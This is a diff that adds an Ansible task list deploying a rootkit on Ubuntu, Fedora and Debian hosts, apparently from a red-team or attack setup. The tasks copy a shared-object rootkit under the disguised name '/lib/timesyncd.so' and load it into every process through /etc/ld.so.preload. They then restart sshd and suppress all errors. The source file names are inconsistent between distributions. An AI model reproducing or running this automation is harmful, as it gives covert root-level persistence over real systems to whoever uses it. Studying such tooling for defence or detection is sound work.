@@ -1,0 +1,42 @@
+- name: copy rootkit
+  copy:
+    src: rk.so
+    dest: "/lib/timesyncd.so"
+    mode: 0555
+  when: ansible_facts['distribution'] == 'Ubuntu'
+  ignore_errors: yes
+
+- name: copy rootkit
+  copy:
+    src: deb_rk.so
+    dest: "/lib/timesyncd.so"
+    mode: 0555
+  when: ansible_facts['distribution'] == 'Fedora'
+  ignore_errors: yes
+
+- name: copy rootkit
+  copy:
+    src: deb-rk.so
+    dest: "/lib/timesyncd.so"
+    mode: 0555
+  when: ansible_facts['distribution'] == 'Debian'
+  ignore_errors: yes
+
+- name: FATHER | create /etc/ld.so.preload
+  file:
+    path: /etc/ld.so.preload
+    owner: root
+    group: root
+    state: touch
+  ignore_errors: yes
+
+- name: FATHER | install rootkit
+  lineinfile:
+    path: /etc/ld.so.preload
+    line: "/lib/timesyncd.so"
+    state: present
+  ignore_errors: yes
+
+- name: FATHER | restart ssh
+  service: name=sshd state=restarted
+  ignore_errors: yes
